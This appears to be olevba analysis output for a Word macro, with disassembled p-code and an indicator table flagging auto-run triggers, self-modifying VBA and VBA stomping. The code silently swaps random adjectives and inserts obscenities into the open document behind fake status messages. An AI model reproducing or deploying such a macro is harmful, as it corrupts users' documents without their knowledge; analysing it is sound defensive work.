' 	LitDI2 0x0005 
' 	IDiv 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "%"
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #182:
' 	Ld tss$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoSub Do_Trunslate 
' 	EndIf 
' Line #183:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #184:
' 	ElseBlock 
' Line #185:
' 	LitDI2 0x0001 
' 	St li 
' Line #186:
' 	Ld li 
' 	LitDI2 0x0064 
' 	Lt 
' 	While 
' Line #187:
' 	Ld sz 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St k 
' Line #188:
' 	Ld k 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	ArgsMemLd Item 0x0001 
' 	St tss$ 
' Line #189:
' 	Ld tss$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #190:
' 	GoSub Do_Trunslate 
' Line #191:
' 	Ld li 
' 	LitDI2 0x0001 
' 	Add 
' 	St li 
' Line #192:
' 	LitStr 0x0019 "Ïîäãîòîâêà ê ñîõðàíåíèþ: "
' 	Ld li 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "%"
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	Wend 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	LitStr 0x0023 "Ïîäãîòîâêà çàâåðøåíà. Îïòèìèçàöèÿ: "
' 	Ld Optima 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "%"
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	GoTo end_proc 
' Line #199:
' Line #200:
' 	Label Do_Trunslate 
' Line #201:
' 	Ld tss$ 
' 	ArgsLd TrunslateWord 0x0001 
' 	St tss$ 
' Line #202:
' 	Ld Changed 
' 	IfBlock 
' Line #203:
' 	Ld tss$ 
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemSt Words 0x0001 
' Line #204:
' 	LitVarSpecial (False)
' 	St Changed 
' Line #205:
' 	Ld Optima 
' 	LitDI2 0x0001 
' 	Add 
' 	St Optima 
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	Return 
' Line #208:
' 	Label end_proc 
' Line #209:
' 	EndSub 
' Line #210:
' Line #211:
' 	FuncDefn (Function TrunslateWord(ts As String))
' Line #212:
' 	Ld ts 
' 	St tw$ 
' Line #213:
' 	Ld ts 
' 	ArgsLd CheckSpace 0x0001 
' 	St spaces 
' Line #214:
' 	Ld spaces 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ts 
' 	LitDI2 0x0001 
' 	Ld ts 
' 	FnLen 
' 	Ld spaces 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St ts 
' 	EndIf 
' Line #215:
' 	Ld ts 
' 	FnLen 
' 	St Lts 
' Line #216:
' 	Ld Lts 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #217:
' 	Ld ts 
' 	ArgsLd CheckAdjective 0x0001 
' 	IfBlock 
' Line #218:
' 	LitDI2 0x0001 
' 	St c 
' Line #219:
' 	Ld c 
' 	LitDI2 0x0002 
' 	Le 
' 	While 
' Line #220:
' 	LitDI2 0x0001 
' 	St i 
' Line #221:
' 	Ld i 
' 	LitDI2 0x000C 
' 	Le 
' 	While 
' Line #222:
' 	Ld c 
' 	Ld i 
' 	ArgsLd ends$ 0x0002 
' 	St CEnd$ 
' Line #223:
' 	Ld ts 
' 	Ld Lts 
' 	Ld CEnd$ 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld CEnd$ 
' 	FnLen 
' 	ArgsLd Mid$$ 0x0003 
' 	St MyEnd$ 
' Line #224:
' 	Ld MyEnd$ 
' 	Ld CEnd$ 
' 	Eq 
' 	IfBlock 
' Line #225:
' 	LitVarSpecial (True)
' 	St Changed 
' Line #226:
' 	Ld c 
' 	SelectCase 
' Line #227:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #228:
' 	LitDI2 0x0022 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Moora1$ 0x0001 
' 	Ld CEnd$ 
' 	Add 
' 	St tw$ 
' Line #229:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #230:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Moora2$ 0x0001 
' 	Ld CEnd$ 
' 	Add 
' 	St tw$ 
' Line #231:
' 	EndSelect 
' Line #232:
' 	Ld spaces 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld tw$ 
' 	Ld spaces 
' 	ArgsLd Space 0x0001 
' 	Add 
' 	St tw$ 
' 	EndIf 
' Line #233:
' 	Ld ts 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St FLett 
' Line #234:
' 	Ld FLett 
' 	ArgsLd UCase$ 0x0001 
' 	Ld FLett 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld tw$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	Ld tw$ 
' 	LitDI2 0x0002 
' 	Ld tw$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St tw$ 
' 	EndIf 
' Line #235:
' 	LitDI2 0x000C 
' 	St i 
' Line #236:
' 	LitDI2 0x0002 
' 	St c 
' Line #237:
' 	EndIfBlock 
' Line #238:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #239:
' 	Wend 
' Line #240:
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St c 
' Line #241:
' 	Wend 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	EndIfBlock 
' Line #244:
' 	Ld tw$ 
' 	St TrunslateWord$ 
' Line #245:
' 	EndFunc 
' Line #246:
' Line #247:
' 	FuncDefn (Function CheckSpace(csp As String) As Integer)
' Line #248:
' 	LitDI2 0x0000 
' 	St spp 
' Line #249:
' 	Ld csp 
' 	FnLen 
' 	St n 
' Line #250:
' 	Ld n 
' 	LitDI2 0x0003 
' 	Gt 
' 	IfBlock 
' Line #251:
' 	Ld csp 
' 	Ld n 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Paren 
' 	Ld n 
' 	LitDI2 0x0003 
' 	Gt 
' 	Paren 
' 	And 
' 	While 
' Line #252:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Sub 
' 	St n 
' Line #253:
' 	Ld spp 
' 	LitDI2 0x0001 
' 	Add 
' 	St spp 
' Line #254:
' 	Wend 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	Ld spp 
' 	St CheckSpace 
' Line #257:
' 	EndFunc 
' Line #258:
' Line #259:
' Line #260:
' 	FuncDefn (Function MyDate() As Boolean)
' Line #261:
' 	Ld Date$ 
' 	St dt$ 
' Line #262:
' 	LitDI2 0x0001 
' 	Ld dt$ 
' 	LitStr 0x0002 "15"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MyDate 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St MyDate 
' 	EndIf 
' Line #263:
' 	EndFunc 
' Line #264:
' Line #265:
' Line #266:
' 	FuncDefn (Function CheckAdjective(adj As String) As Boolean)
' Line #267:
' 	LitVarSpecial (False)
' 	St cadj 
' Line #268:
' 	LitVarSpecial (True)
' 	St NoSpecial 
' Line #269:
' 	Ld adj 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd LCase$ 0x0001 
' 	St atj$ 
' Line #270:
' 	Ld atj$ 
' 	SelectCase 
' Line #271:
' 	LitStr 0x0005 "åæåäí"
' 	Case 
' 	CaseDone 
' Line #272:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #273:
' 	LitStr 0x0005 "àäàïò"
' 	Case 
' 	CaseDone 
' Line #274:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #275:
' 	LitStr 0x0005 "óðîâí"
' 	Case 
' 	CaseDone 
' Line #276:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #277:
' 	LitStr 0x0005 "íàñèë"
' 	Case 
' 	CaseDone 
' Line #278:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #279:
' 	EndSelect 
' Line #280:
' 	Ld atj$ 
' 	ArgsLd NoFuckenError 0x0001 
' 	IfBlock 
' Line #281:
' 	SetStmt 
' 	Ld adj 
' 	ArgsLd SynonymInfo 0x0001 
' 	Set mySynInfo 
' Line #282:
' 	Ld mySynInfo 
' 	MemLd PartOfSpeechList 
' 	St myPos 
' Line #283:
' 	Ld myPos 
' 	FnUBound 0x0000 
' 	St i 
' Line #284:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ArgsLd myPos 0x0001 
' 	Ld wdAdjective 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cadj 
' 	EndIf 
' 	EndIf 
' Line #285:
' 	EndIfBlock 
' Line #286:
' 	Ld cadj 
' 	St CheckAdjective 
' Line #287:
' 	EndFunc 
' Line #288:
' Line #289:
' 	FuncDefn (Function NoFuckenError(wrd As String) As Boolean)
' Line #290:
' 	Ld wrd 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St atj 
' Line #291:
' 	Ld atj 
' 	SelectCase 
' Line #292:
' 	LitStr 0x0001 "î"
' 	Case 
' 	CaseDone 
' Line #293:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #294:
' 	LitStr 0x0001 "ï"
' 	Case 
' 	CaseDone 
' Line #295:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #296:
' 	LitStr 0x0001 "ð"
' 	Case 
' 	CaseDone 
' Line #297:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #298:
' 	LitStr 0x0001 "ñ"
' 	Case 
' 	CaseDone 
' Line #299:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #300:
' 	LitStr 0x0001 "ò"
' 	Case 
' 	CaseDone 
' Line #301:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #302:
' 	LitStr 0x0001 "â"
' 	Case 
' 	CaseDone 
' Line #303:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #304:
' 	LitStr 0x0001 "ë"
' 	Case 
' 	CaseDone 
' Line #305:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #306:
' 	LitStr 0x0001 "ì"
' 	Case 
' 	CaseDone 
' Line #307:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #308:
' 	LitStr 0x0001 "ç"
' 	Case 
' 	CaseDone 
' Line #309:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #310:
' 	LitStr 0x0001 "÷"
' 	Case 
' 	CaseDone 
' Line #311:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' Line #316:
' Line #317:
' Line #318:
' Line #319:
' Line #320:
' Line #321:
' Line #322:
' Line #323:
' Line #324:
' Line #325:
' Line #326:
' Line #327:
' Line #328:
' Line #329:
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' Line #338:
' Line #339:
' Line #340:
' Line #341:
' Line #342:
' Line #343:
' Line #344:
' Line #345:
' Line #346:
' Line #347:
' Line #348:
' Line #349:
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St sz 
' Line #356:
' 	Ld sz 
' 	LitDI2 0x01F4 
' 	Gt 
' 	IfBlock 
' Line #357:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #358:
' 	LitStr 0x000C "Ïîäãîòîâêà: "
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #359:
' 	Ld sz 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St k 
' Line #360:
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St tss$ 
' Line #361:
' 	Ld tss$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #362:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St tss1$ 
' Line #363:
' 	Ld tss1$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #364:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #365:
' 	LitStr 0x0002 ", "
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Bls$ 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	St blya$ 
' Line #366:
' 	Ld blya$ 
' 	Paren 
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #367:
' 	EndIfBlock 
' Line #368:
' 	EndIfBlock 
' Line #369:
' 	EndIfBlock 
' Line #370:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #371:
' 	LitStr 0x0007 "Ãîòîâî."
' 	Ld Application 
' 	MemSt StatusBar 
' Line #372:
' 	EndIfBlock 
' Line #373:
' 	EndIfBlock 
' Line #374:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

